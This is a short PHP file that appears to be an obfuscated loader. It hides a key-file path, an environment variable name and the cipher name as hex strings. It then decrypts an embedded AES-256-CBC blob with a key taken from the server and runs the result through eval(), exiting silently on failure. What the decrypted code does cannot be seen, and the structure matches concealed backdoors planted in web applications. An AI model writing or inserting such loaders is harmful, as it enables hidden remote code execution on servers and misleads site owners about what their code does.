<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('Qj/1n8ZxmCp0n3v71QOT1Q==');
$c=base64_decode(
'OVkrXGWK2eTZq/Xnai1AaajWjSvbz0B1jeIBMG/yjjujzYbrX7PH0KD+uKRPf7R24EbYf4cPsKNz' .
'LmaO8/rBkJOEU9gol51hwrodWSTkW3LijBzPsQYluudL3XPMDP8njSskt06DC/A8eXzkHBCz2dzb' .
'pD8drru5YU5hcpKHC7GqF/JnTZPfVlWiMOPvLO+hROV2jGxT+Mtrwpbx5lQZMGJ0js4NBQjVyhLo' .
'9Xdgq7KtEFBaTqRX2lC8p0GOyrUzYcYEi/NuHx/UVfY7Hr1lkb8ltEoS+uBcCwFvFezuKFbi1yie' .
'Mik5aF7ihnveToQsNx9lA2rqFmfQrQwNC37Q3+ODsAIUe2X0LV6gC7/VQs7jeTOKIdAhq3QelM+5' .
'UEiV92IRGeQ0d3R5sXrX4TjDi3uthSOyiMPX/R3wzYb/GJKIoc65jhdwoHBjV3uzw+HljSNJP5F2' .
'YK3ZiGjXcig4awDahVmbg+XvxbJC5BlpbUhXE7R3lcXAJU3hMf0TxvP6ECRIuLIPjsoZ/RPcs/X8' .
'0fPwpnZNhGLjeXky/lweArnLt7ZHvh5AL9CuSTxW1f8LISuOfJK0XIYvzCx55a7XUSn6R7YWKgAD' .
'gH0e+BuNDeng3znv+Y/SFn7fqIG5OBz1E9PmWhNglMJcIMDjRgKysmF+cAKUCm3ajQKqj0XRtAgj' .
'6urP6l4/QRTH1G2owNFWc8yskuPbzW9SjZt3zUU5xQ=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
